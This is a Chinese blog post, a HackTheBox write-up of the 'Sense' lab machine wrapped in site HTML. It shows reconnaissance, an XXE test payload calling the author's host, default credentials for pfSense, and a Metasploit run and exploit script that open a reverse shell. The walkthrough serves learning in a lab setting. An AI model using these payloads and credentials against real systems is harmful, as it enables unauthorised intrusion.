@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="弄明白你打的网站，是什么 cms，跑的什么中间件，靶机风评如何，很有必要！  10.10.10.60) Nmap123456789101112# nmap -p- -sC -sV 10.10.10.60nmap scan report for 10.10.10.60Host is up (0.0058s latency).Not shown: 65533 filtered portsPORT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox：Sense笔记">
+<meta property="og:url" content="http://unc1e.com/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Unc1e的博客">
+<meta property="og:description" content="弄明白你打的网站，是什么 cms，跑的什么中间件，靶机风评如何，很有必要！  10.10.10.60) Nmap123456789101112# nmap -p- -sC -sV 10.10.10.60nmap scan report for 10.10.10.60Host is up (0.0058s latency).Not shown: 65533 filtered portsPORT">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729425195-edd08efe-80aa-4fc8-8213-6be000a8f0fd.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=718&size=114205&status=done&style=none&width=359">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729534655-00471b96-ee98-450a-96b8-2890c99047c3.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=401&size=43455&status=done&style=none&width=200.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766011762-f1f15c9a-d60e-43de-b3d3-6919607efa83.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=994&originWidth=1577&size=170558&status=done&style=none&width=788.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590731574070-bd7757a6-e59e-4f3e-8ba0-b994cbbeb732.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=133&originWidth=842&size=22571&status=done&style=none&width=421">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590733092577-5ab408a8-e773-4d0e-89fb-004d49d1e546.png#align=left&display=inline&height=987&margin=%5Bobject%20Object%5D&name=dragonfly.png&originHeight=987&originWidth=1910&size=236078&status=done&style=none&width=1910">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766665129-28940fa6-a83a-4b18-b6ae-66eb2fd4de86.png#align=left&display=inline&height=450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=899&originWidth=1554&size=143893&status=done&style=none&width=777">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766843344-cc662a21-85d7-4ac0-bfbd-62ddf43506c4.png#align=left&display=inline&height=942&margin=%5Bobject%20Object%5D&name=logined.png&originHeight=942&originWidth=1613&size=177747&status=done&style=none&width=1613">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590767623073-864541e9-c3ab-45f9-97e5-4db13ce45006.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=py-exp.png&originHeight=141&originWidth=1187&size=57572&status=done&style=none&width=1187">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766699999-b025290e-5406-4518-88bd-79875e00d0d8.png#align=left&display=inline&height=989&margin=%5Bobject%20Object%5D&name=clue.png&originHeight=989&originWidth=1919&size=331603&status=done&style=none&width=1919">
+<meta property="article:published_time" content="2020-05-29T05:12:57.000Z">
+<meta property="article:modified_time" content="2020-07-16T02:35:51.676Z">
+<meta property="article:author" content="Unc1e">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729425195-edd08efe-80aa-4fc8-8213-6be000a8f0fd.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=718&size=114205&status=done&style=none&width=359">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://unc1e.com/2020/05/29/yuque/HackTheBox：Sense笔记/"/>
+
+
+
+
+
+  <title>HackTheBox：Sense笔记 | Unc1e的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Unc1e的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Unc1e">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Unc1e的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HackTheBox：Sense笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-29T13:12:57+08:00">
+                2020-05-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>弄明白你打的网站，是什么 cms，跑的什么中间件，靶机风评如何，很有必要！</p>
+</blockquote>
+<p>10.10.10.60<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729425195-edd08efe-80aa-4fc8-8213-6be000a8f0fd.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=718&size=114205&status=done&style=none&width=359" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729534655-00471b96-ee98-450a-96b8-2890c99047c3.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=401&size=43455&status=done&style=none&width=200.5" alt="image.png"></p>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -p- -sC -sV 10.10.10.60</span></span><br><span class="line"></span><br><span class="line">nmap scan report for 10.10.10.60</span><br><span class="line">Host is up (0.0058s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT    STATE SERVICE    VERSION</span><br><span class="line">80/tcp  open  http       lighttpd 1.4.35</span><br><span class="line">|_http-server-header: lighttpd/1.4.35</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.60/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (<span class="keyword">use</span> -d <span class="keyword">to</span> debug)</span><br><span class="line"><span class="number">443</span>/tcp <span class="keyword">open</span>  ssl/https?</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does <span class="keyword">not</span> represent <span class="built_in">time</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="lighttpd-1-4-35"><a href="#lighttpd-1-4-35" class="headerlink" title="lighttpd 1.4.35"></a>lighttpd 1.4.35</h1><p>80 端口会跳转到 443，443 端口是这个 web<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766011762-f1f15c9a-d60e-43de-b3d3-6919607efa83.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=994&originWidth=1577&size=170558&status=done&style=none&width=788.5" alt="image.png"></p>
+<h2 id="dirb-扫目录"><a href="#dirb-扫目录" class="headerlink" title="dirb 扫目录"></a>dirb 扫目录</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">[~]$ dirb https://10.10.10.60</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">START_TIME: Fri May 29 05:22:42 2020</span><br><span class="line">URL_BASE: https://10.10.10.60/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Scanning URL: https://10.10.10.60/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/classes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/css/</span><br><span class="line">+ https://10.10.10.60/favicon.ico (CODE:200|SIZE:1406)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/includes/</span><br><span class="line">+ https://10.10.10.60/index.html (CODE:200|SIZE:329)</span><br><span class="line">+ https://10.10.10.60/index.php (CODE:200|SIZE:6690)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/installer/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/themes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/tree/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/</span><br><span class="line">+ https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/classes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/css/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/includes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/installer/ ----</span></span><br><span class="line">+ https://10.10.10.60/installer/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/index/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/wizard/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/themes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/tree/ ----</span></span><br><span class="line">+  (CODE:200|SIZE:7492)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/include/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/widgets/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/index/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/images/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/wizard/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/include/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/javascript/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/widgets/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/images/ ----</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="xmlrpc-php"><a href="#xmlrpc-php" class="headerlink" title="/xmlrpc.php"></a>/xmlrpc.php</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590731574070-bd7757a6-e59e-4f3e-8ba0-b994cbbeb732.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=133&originWidth=842&size=22571&status=done&style=none&width=421" alt="image.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM "http://10.10.14.4:88"&gt; %pe; %param1; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;external;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试过，无 xxe 问题</p>
+<h3 id="tree-index-html"><a href="#tree-index-html" class="headerlink" title="/tree/index.html"></a>/tree/index.html</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590733092577-5ab408a8-e773-4d0e-89fb-004d49d1e546.png#align=left&display=inline&height=987&margin=%5Bobject%20Object%5D&name=dragonfly.png&originHeight=987&originWidth=1910&size=236078&status=done&style=none&width=1910" alt="dragonfly.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   Connect to host via SSH:</span><br><span class="line">   &lt;applet CODEBASE="." ARCHIVE="jta20.jar" CODE="de.mud.jta.Applet" WIDTH=55 HEIGHT=25&gt;</span><br><span class="line">&lt;param NAME="config" VALUE="applet.conf"&gt;</span><br><span class="line">   &lt;/applet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不知道啥意思。。。</p>
+<h1 id="breakthrough"><a href="#breakthrough" class="headerlink" title="breakthrough"></a>breakthrough</h1><p>用 dirbuster 再扫目录，用最大的字典</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+
+<p>find something juicy，发现了些好东西</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://10.10.10.60//changelog.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment"># Security Changelog</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Issue</span></span><br><span class="line">There was a failure in updating the firewall. Manual patching is therefore required</span><br><span class="line"></span><br><span class="line"><span class="comment">### Mitigated</span></span><br><span class="line">2 of 3 vulnerabilities have been patched.</span><br><span class="line"></span><br><span class="line"><span class="comment">### Timeline</span></span><br><span class="line">The remaining patches will be installed during the next maintenance window</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://10.10.10.60/system-users.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment">####Support ticket###</span></span><br><span class="line"></span><br><span class="line">Please <span class="keyword">create</span> the <span class="keyword">following</span> <span class="keyword">user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username: Rohit</span><br><span class="line"><span class="keyword">password</span>: company <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure>
+
+<p>公司默认密码？osint，搜索引擎走起<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766665129-28940fa6-a83a-4b18-b6ae-66eb2fd4de86.png#align=left&display=inline&height=450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=899&originWidth=1554&size=143893&status=done&style=none&width=777" alt="image.png"></p>
+<p>直接登录了哦，<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766843344-cc662a21-85d7-4ac0-bfbd-62ddf43506c4.png#align=left&display=inline&height=942&margin=%5Bobject%20Object%5D&name=logined.png&originHeight=942&originWidth=1613&size=177747&status=done&style=none&width=1613" alt="logined.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set username rohit</span><br><span class="line">username =&gt; rohit</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set password pfsense</span><br><span class="line">password =&gt; pfsense</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.16.122</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set rhosts 10.10.10.60</span><br><span class="line">rhosts =&gt; 10.10.10.60</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload</span><br><span class="line">[*] Payload uploaded successfully, executing</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.60</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.60:39519) at 2020-05-29 23:26:58 +0800</span><br></pre></td></tr></table></figure>
+
+<p>或者用 searchexploit 里的 exp 拿 shell<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590767623073-864541e9-c3ab-45f9-97e5-4db13ce45006.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=py-exp.png&originHeight=141&originWidth=1187&size=57572&status=done&style=none&width=1187" alt="py-exp.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 43560.py --rhost 10.10.10.60  --lhost 10.10.16.122 --lport 1337 --username rohit --password pfsense</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><p>一开始根本没锁定这个 pfSense,还是经验不够了，只注意了 lighttpd</p>
+<ol>
+<li>icon 跟 body 其实都有蛛丝马迹<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766699999-b025290e-5406-4518-88bd-79875e00d0d8.png#align=left&display=inline&height=989&margin=%5Bobject%20Object%5D&name=clue.png&originHeight=989&originWidth=1919&size=331603&status=done&style=none&width=1919" alt="clue.png"></li>
+<li>enumeration！<br>常用扫目录工具有 dirbuster+ dirb + wfuzz</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/25/yuque/HackTheBox%EF%BC%9ABeep%E7%AC%94%E8%AE%B0/" rel="next" title="HackTheBox：Beep笔记">
+                <i class="fa fa-chevron-left"></i> HackTheBox：Beep笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/" rel="prev" title="HackTheBox：Active笔记">
+                HackTheBox：Active笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Unc1e</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Nmap"><span class="nav-number">1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lighttpd-1-4-35"><span class="nav-number">2.</span> <span class="nav-text">lighttpd 1.4.35</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dirb-扫目录"><span class="nav-number">2.1.</span> <span class="nav-text">dirb 扫目录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xmlrpc-php"><span class="nav-number">2.1.1.</span> <span class="nav-text">&#x2F;xmlrpc.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tree-index-html"><span class="nav-number">2.1.2.</span> <span class="nav-text">&#x2F;tree&#x2F;index.html</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#breakthrough"><span class="nav-number">3.</span> <span class="nav-text">breakthrough</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复盘"><span class="nav-number">4.</span> <span class="nav-text">复盘</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Unc1e</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
